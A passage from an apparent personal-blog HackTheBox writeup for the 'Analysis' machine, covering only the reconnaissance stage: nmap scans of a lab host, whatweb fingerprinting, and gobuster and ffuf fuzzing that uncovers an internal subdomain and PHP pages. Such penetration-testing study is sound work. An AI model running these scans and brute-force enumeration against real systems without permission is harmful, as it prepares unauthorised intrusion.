@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="description" content="Astro description"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="../../img/jhon-doe.webp"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.11.3"><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><title> Analysis HTB Writeup</title><link rel="stylesheet" href="/_astro/about.Bct-2e9R.css">
+<style>p{font-size:1.8rem}p:has(>img){display:flex;justify-content:center}p>img{width:100%;max-width:80rem;min-width:27rem}h2,h3,h4,h5,h6{color:#fff;font-weight:700;margin:2rem 0}h2{font-size:var(--text-xx-large)}h3{font-size:var(--text-x-large)}h4{font-size:var(--text-large)}pre{font-size:1.8rem;padding:1rem;margin:3rem 0;border-radius:.5rem}@media screen and (max-width:768px){h2{font-size:2rem}}
+.header{display:flex;width:100%;padding:2rem;justify-content:center;align-items:center;color:var(--on-primary);position:fixed;z-index:3}.header .header__container{display:flex;width:100%;max-width:var(--max-width);justify-content:space-between;background:#0003;-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);padding:1rem 2rem;border-radius:14px;height:auto;min-height:7rem;border:.03px solid #7c39fd47;flex-wrap:wrap}.header .profile .header__title{font-size:var(--text-title);font-weight:600;cursor:pointer}.header .header__list{display:flex;align-items:center;justify-content:space-evenly;gap:2rem;margin-right:4.4rem}.header .links{display:flex;gap:22px;font-size:var(--text-general)}.header .links a{position:relative}.header .links a:after{position:absolute;bottom:0;left:0;content:"";width:100%;transform:scaleX(0);transform-origin:0;height:2px;background:var(--primary);transition:.35s transform}.header .links a:hover{color:var(--primary-90)}.header .links a:hover:after{transform:scale(1)}.icons,.menu__btn{display:none}@media screen and (max-width: 768px){.header{padding:1rem}.header .links{position:fixed;width:100%;top:calc(100vh - 16rem);justify-content:center;align-items:center;right:0;align-self:center;flex-direction:column;pointer-events:none}.header .header__list{margin-right:0;z-index:2;background:#1c0544;justify-content:center;align-items:center;border-radius:14px;width:100%;padding:.8rem 1rem;border:1px solid #dc5898;align-self:center;opacity:0;pointer-events:none}.links:focus-within .header__list{opacity:1;pointer-events:all}.links:focus-within .menu__btn{opacity:0;pointer-events:none}.links:not(:hover) .header__list{opacity:0;pointer-events:none}.icon__container{display:flex;flex-direction:column;align-items:center}.icons{display:block}.menu__btn{display:flex;justify-content:center;align-items:center;padding:.5rem 2rem;background:var(--hero-bg);border-radius:100px;font-size:var(--text-x-large);transition:.35s opacity;max-width:-moz-max-content;max-width:max-content;color:#33f3c6;position:absolute;border:2px solid #33f3c6;pointer-events:all;animation:linear scroll-btn;animation-timeline:scroll()}}@keyframes scroll-btn{0%,1%{opacity:0}2%{opacity:inherit}}.img__container[data-astro-cid-tvrurpns]{border-radius:50%;overflow:hidden;transition:.35s transform}.img__container[data-astro-cid-tvrurpns]:hover{transform:scale(1.1)}.profile[data-astro-cid-tvrurpns]{display:flex;border-radius:50%;align-items:center;gap:1.5rem}footer{width:100%;background:#131313;display:flex;justify-content:space-between;min-height:20dvh;color:var(--primary-100);align-items:center;padding:1rem 4rem;flex-wrap:wrap;h3{font-size:var(--text-title)}}.footer__container{display:flex;flex-direction:column;align-items:flex-start;gap:2rem}.footer__link{display:flex;align-items:center;justify-content:flex-start;gap:1rem;font-size:var(--text-large)}
+:root{--primary-0: #190230;--primary-10: #2b1560;--primary-20: #442288;--primary-30: #5529ae;--primary-40: #6632cf;--primary-50: #7644e3;--primary-60: #8664ee;--primary-70: #a491f4;--primary-80: #c2b9f9;--primary-90: #dcd8fc;--primary-95: #edeafd;--primary-99: #f4f4fe;--primary-100: #ffffff;--secondary-0: #1c050e;--secondary-10: #490e25;--secondary-20: #782344;--secondary-30: #87224a;--secondary-40: #ae285f;--secondary-50: #c93978;--secondary-60: #dc5898;--secondary-70: #e77fb4;--secondary-80: #f1b0d3;--secondary-90: #f7d3e7;--secondary-95: #fae9f3;--secondary-99: #fcf3f8;--secondary-100: #ffffff;--surface: #4F4360;--surface-variant: #e0d8e7;--surface-dim: #998da9;--surface-bridge: #d6cdee;--primary: var(--primary-60);--on-surface-primary: var(--primary-10);--on-primary: var(--primary-95);--secndary: var(--secondary-70);--on-surface-secondary: var(--secondary-95);--on-secondary: var(--secondary-95);--text-small: 1.2rem;--text-medium: 1.4rem;--text-large: 1.6rem;--text-x-large: 2rem;--text-xx-large: 3.1rem;--text-xxx-large: 4.4rem;--text-title: 2rem;--text-general: 1.6rem;--text-button: 1.2rem;--font-montserrat: "Montserrat", sans-serif;--max-width: 108rem;--site-bg: var(--primary-0);--hero-bg: linear-gradient( -54deg, var(--primary-0) -23%, var(--primary-20), var(--primary-0) 51% );--text-gradient: radial-gradient( circle farthest-corner at center center, #58f9ff 0%, #df44e7 100% )}*{box-sizing:border-box}html{font-family:var(--font-montserrat)!important;font-size:62.5%;scroll-behavior:smooth}body{width:100%;background:var(--site-bg) no-repeat}main{align-self:center}p{color:var(--primary-100);font-size:var(--text-general)}.color__gradiente{background:var(--text-gradient);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}.max__width{max-width:117.8rem}
+.icons__container[data-astro-cid-dv46nlzh]{display:flex;width:29.6rem;justify-content:flex-start;align-items:flex-start;gap:2rem}.skill__icon[data-astro-cid-dv46nlzh]{color:#dcd8fc}.LinkedIn[data-astro-cid-dv46nlzh]:hover{color:#0e76a8}.Instagram[data-astro-cid-dv46nlzh]:hover{color:#e1306c}.Tiwtter[data-astro-cid-dv46nlzh]:hover{color:#0aa5f6}.CV[data-astro-cid-dv46nlzh]:hover{color:#8e64ff}
+</style><script type="module" src="/_astro/hoisted.DT4-tm6l.js"></script></head> <body> <header class="header"> <div class="header__container"> <a href="/" class="profile" data-astro-cid-tvrurpns> <div class="img__container" data-astro-cid-tvrurpns> <img class="header__img" src="/img/p.png" alt="mil4ne img" width="40px" height="40px" data-astro-cid-tvrurpns> </div> <h3 class="color__gradiente header__title" data-astro-cid-tvrurpns> Mil4ne </h3> </a>  <nav class="links" tabindex="0.1"> <button class="menu__btn">Menú</button> <ul class="header__list"> <li> <a class="menu__link" href="/"> <span class="icon__container"> <iconify-icon class="icons" icon="/img/p.png" width="20" height="20"></iconify-icon> Home </span> </a> </li><li> <a class="menu__link" href="/#about"> <span class="icon__container"> <iconify-icon class="icons" icon="/img/p.png" width="20" height="20"></iconify-icon> About </span> </a> </li><li> <a class="menu__link" href="/#portafolio"> <span class="icon__container"> <iconify-icon class="icons" icon="/img/p.png" width="20" height="20"></iconify-icon> Portfolio </span> </a> </li> </ul> </nav> </div> </header> <main class="w-full flex flex-col justify-center  items-center pt-[13rem]"> <div class="text-center"> <h1 class="text-4xl text-center font-extrabold color__gradiente mb-3">Analysis HTB Writeup</h1> <time class="text-white text-2xl  " datetime="2024-04-26T04:00:00.000Z"> Apr 26, 2024 </time> </div> <section class="flex flex-col md:max-w-[57%]  max-w-[100%] min-w-[30rem]  px-5 pt-10 pb-[3rem] justify-center w-[80%">  <h2 id="initial-recon"><span style="color: #33acff">Initial Recon</span></h2>
+<p>We start our scans with nmap.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>> sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv 10.10.11.250 -oN Nmap </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PORT      STATE SERVICE          REASON</span></span>
+<span class="line"><span>53/tcp    open  domain           syn-ack ttl 127</span></span>
+<span class="line"><span>80/tcp    open  http             syn-ack ttl 127</span></span>
+<span class="line"><span>88/tcp    open  kerberos-sec     syn-ack ttl 127</span></span>
+<span class="line"><span>135/tcp   open  msrpc            syn-ack ttl 127</span></span>
+<span class="line"><span>139/tcp   open  netbios-ssn      syn-ack ttl 127</span></span>
+<span class="line"><span>389/tcp   open  ldap             syn-ack ttl 127</span></span>
+<span class="line"><span>445/tcp   open  microsoft-ds     syn-ack ttl 127</span></span>
+<span class="line"><span>464/tcp   open  kpasswd5         syn-ack ttl 127</span></span>
+<span class="line"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl 127</span></span>
+<span class="line"><span>636/tcp   open  ldapssl          syn-ack ttl 127</span></span>
+<span class="line"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl 127</span></span>
+<span class="line"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl 127</span></span>
+<span class="line"><span>3306/tcp  open  mysql            syn-ack ttl 127</span></span>
+<span class="line"><span>5985/tcp  open  wsman            syn-ack ttl 127</span></span>
+<span class="line"><span>9389/tcp  open  adws             syn-ack ttl 127</span></span>
+<span class="line"><span>33060/tcp open  mysqlx           syn-ack ttl 127</span></span>
+<span class="line"><span>47001/tcp open  winrm            syn-ack ttl 127</span></span>
+<span class="line"><span>49664/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49665/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49666/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49667/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49671/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49674/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49675/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49676/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49677/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49682/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>49732/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span>63270/tcp open  unknown          syn-ack ttl 127</span></span>
+<span class="line"><span></span></span></code></pre>
+<h3 id="nmap-version-scan">Nmap version Scan</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>> sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49732,6327 -sCV 10.10.11.250 -oN Ports</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 19:49 EDT</span></span>
+<span class="line"><span>Nmap scan report for 10.10.11.250 (10.10.11.250)</span></span>
+<span class="line"><span>Host is up (0.11s latency).</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PORT      STATE  SERVICE       VERSION</span></span>
+<span class="line"><span>53/tcp    open   domain        Simple DNS Plus</span></span>
+<span class="line"><span>80/tcp    open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>|_http-server-header: Microsoft-HTTPAPI/2.0</span></span>
+<span class="line"><span>|_http-title: Not Found</span></span>
+<span class="line"><span>88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-05 23:55:03Z)</span></span>
+<span class="line"><span>135/tcp   open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn</span></span>
+<span class="line"><span>389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>445/tcp   open   microsoft-ds?</span></span>
+<span class="line"><span>464/tcp   open   kpasswd5?</span></span>
+<span class="line"><span>593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
+<span class="line"><span>636/tcp   open   tcpwrapped</span></span>
+<span class="line"><span>3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>3269/tcp  open   tcpwrapped</span></span>
+<span class="line"><span>3306/tcp  open   mysql         MySQL (unauthorized)</span></span>
+<span class="line"><span>5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>|_http-server-header: Microsoft-HTTPAPI/2.0</span></span>
+<span class="line"><span>|_http-title: Not Found</span></span>
+<span class="line"><span>6327/tcp  closed unknown</span></span>
+<span class="line"><span>9389/tcp  open   mc-nmf        .NET Message Framing</span></span>
+<span class="line"><span>33060/tcp open   mysqlx?</span></span>
+<span class="line"><span>| fingerprint-strings: </span></span>
+<span class="line"><span>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, X11Probe: </span></span>
+<span class="line"><span>|     Invalid message"</span></span>
+<span class="line"><span>|     HY000</span></span>
+<span class="line"><span>|   LDAPBindReq: </span></span>
+<span class="line"><span>|     *Parse error unserializing protobuf message"</span></span>
+<span class="line"><span>|     HY000</span></span>
+<span class="line"><span>|   oracle-tns: </span></span>
+<span class="line"><span>|     Invalid message-frame."</span></span>
+<span class="line"><span>|_    HY000</span></span>
+<span class="line"><span>47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>|_http-title: Not Found</span></span>
+<span class="line"><span>|_http-server-header: Microsoft-HTTPAPI/2.0</span></span>
+<span class="line"><span>49664/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49665/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49666/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49667/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49671/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
+<span class="line"><span>49675/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49676/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49677/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49682/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49732/tcp open   msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span>
+<span class="line"><span>SF-Port33060-TCP:V=7.94SVN%I=7%D=6/5%Time=6660F9B2%P=x86_64-pc-linux-gnu%r</span></span>
+<span class="line"><span>SF:(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\</span></span>
+<span class="line"><span>SF:0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")</span></span>
+<span class="line"><span>SF:%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0</span></span>
+<span class="line"><span>SF:\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05</span></span>
+<span class="line"><span>SF:\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0</span></span>
+<span class="line"><span>SF:\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9</span></span>
+<span class="line"><span>SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08</span></span>
+<span class="line"><span>SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x</span></span>
+<span class="line"><span>SF:05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Ke</span></span>
+<span class="line"><span>SF:rberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b</span></span>
+<span class="line"><span>SF:\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\</span></span>
+<span class="line"><span>SF:x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFou</span></span>
+<span class="line"><span>SF:rRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0</span></span>
+<span class="line"><span>SF:b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\</span></span>
+<span class="line"><span>SF:0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDA</span></span>
+<span class="line"><span>SF:PBindReq,46,"\x05</span></span>
+<span class="line"><span></span></span></code></pre>
+<h2 id="web"><span style="color: #33acff">Web</span></h2>
+<img src="img/1.png" alt="">
+<p>we try to run whatweb:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">></span><span style="color:#E1E4E8"> whatweb http://analysis.htb/ </span></span>
+<span class="line"><span style="color:#B392F0">http://analysis.htb/</span><span style="color:#E1E4E8"> [200 </span><span style="color:#9ECBFF">OK]</span><span style="color:#9ECBFF"> Country[RESERVED][ZZ],</span><span style="color:#9ECBFF"> Email[mail@demolink.org,privacy@demolink.org],</span><span style="color:#9ECBFF"> HTTPServer[Microsoft-IIS/10.0],</span><span style="color:#9ECBFF"> IP[10.10.11.250],</span><span style="color:#9ECBFF"> JQuery,</span><span style="color:#9ECBFF"> Microsoft-IIS[10.0],</span><span style="color:#9ECBFF"> Script[text/javascript]</span></span>
+<span class="line"></span></code></pre>
+<p>We try to fuzz to find subdirectories:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://analysis.htb</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 40</span></span>
+<span class="line"></span></code></pre>
+<img src="img/2.png" alt="">
+<p>But we don’t see anything interesting.</p>
+<p>We can try to look for subdomains:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ffuf</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://10.10.11.250</span><span style="color:#79B8FF"> -H</span><span style="color:#9ECBFF"> "Host: FUZZ.analysis.htb"</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><span style="color:#79B8FF"> -mc</span><span style="color:#9ECBFF"> all</span><span style="color:#79B8FF"> -ac</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"></span></code></pre>
+<img src="img/3.png" alt="">
+<img src="img/4.png" alt="">
+<p>we fuzz this new subdomain:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://internal.analysis.htb</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 55</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">/users</span><span style="color:#E1E4E8">                (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 170] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/users/]</span></span>
+<span class="line"><span style="color:#B392F0">/dashboard</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 174] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/]</span></span>
+<span class="line"><span style="color:#B392F0">/Users</span><span style="color:#E1E4E8">                (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 170] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/Users/]</span></span>
+<span class="line"><span style="color:#B392F0">/employees</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 174] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/employees/]</span></span>
+<span class="line"><span style="color:#B392F0">/Dashboard</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 174] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/Dashboard/]</span></span>
+<span class="line"></span></code></pre>
+<p>We can also filter by php extensions in these subdirectories:</p>
+<ul>
+<li><code>users</code></li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://internal.analysis.htb/users/</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 55</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">/list.php</span><span style="color:#E1E4E8">             (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 17]</span></span>
+<span class="line"><span style="color:#B392F0">/List.php</span><span style="color:#E1E4E8">             (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 17]</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li><code>dashboard</code></li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://internal.analysis.htb/dashboard/</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 55</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">/img</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/img/]</span></span>
+<span class="line"><span style="color:#B392F0">/index.php</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 38]</span></span>
+<span class="line"><span style="color:#B392F0">/uploads</span><span style="color:#E1E4E8">              (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 182] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/uploads/]</span></span>
+<span class="line"><span style="color:#B392F0">/upload.php</span><span style="color:#E1E4E8">           (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 0]</span></span>
+<span class="line"><span style="color:#B392F0">/details.php</span><span style="color:#E1E4E8">          (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/css</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/css/]</span></span>
+<span class="line"><span style="color:#B392F0">/Index.php</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 38]</span></span>
+<span class="line"><span style="color:#B392F0">/lib</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/lib/]</span></span>
+<span class="line"><span style="color:#B392F0">/form.php</span><span style="color:#E1E4E8">             (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/js</span><span style="color:#E1E4E8">                   (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 177] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/js/]</span></span>
+<span class="line"><span style="color:#B392F0">/logout.php</span><span style="color:#E1E4E8">           (Status: </span><span style="color:#79B8FF">302</span><span style="color:#E1E4E8">) [Size: 3] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> ../employees/login.php]</span></span>
+<span class="line"><span style="color:#B392F0">/tickets.php</span><span style="color:#E1E4E8">          (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/emergency.php</span><span style="color:#E1E4E8">        (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/IMG</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/IMG/]</span></span>
+<span class="line"><span style="color:#B392F0">/INDEX.php</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 38]</span></span>
+<span class="line"><span style="color:#B392F0">/Details.php</span><span style="color:#E1E4E8">          (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/Form.php</span><span style="color:#E1E4E8">             (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/CSS</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/CSS/]</span></span>
+<span class="line"><span style="color:#B392F0">/Img</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/Img/]</span></span>
+<span class="line"><span style="color:#B392F0">/JS</span><span style="color:#E1E4E8">                   (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 177] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/JS/]</span></span>
+<span class="line"><span style="color:#B392F0">/Upload.php</span><span style="color:#E1E4E8">           (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 0]</span></span>
+<span class="line"><span style="color:#B392F0">/Uploads</span><span style="color:#E1E4E8">              (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 182] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/Uploads/]</span></span>
+<span class="line"><span style="color:#B392F0">/Logout.php</span><span style="color:#E1E4E8">           (Status: </span><span style="color:#79B8FF">302</span><span style="color:#E1E4E8">) [Size: 3] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> ../employees/login.php]</span></span>
+<span class="line"><span style="color:#B392F0">/Lib</span><span style="color:#E1E4E8">                  (Status: </span><span style="color:#79B8FF">301</span><span style="color:#E1E4E8">) [Size: 178] [--</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> http://internal.analysis.htb/dashboard/Lib/]</span></span>
+<span class="line"><span style="color:#B392F0">/Tickets.php</span><span style="color:#E1E4E8">          (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"><span style="color:#B392F0">/Emergency.php</span><span style="color:#E1E4E8">        (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 35]</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li><code>employes</code></li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://internal.analysis.htb/employees/</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 55</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> php</span></span>
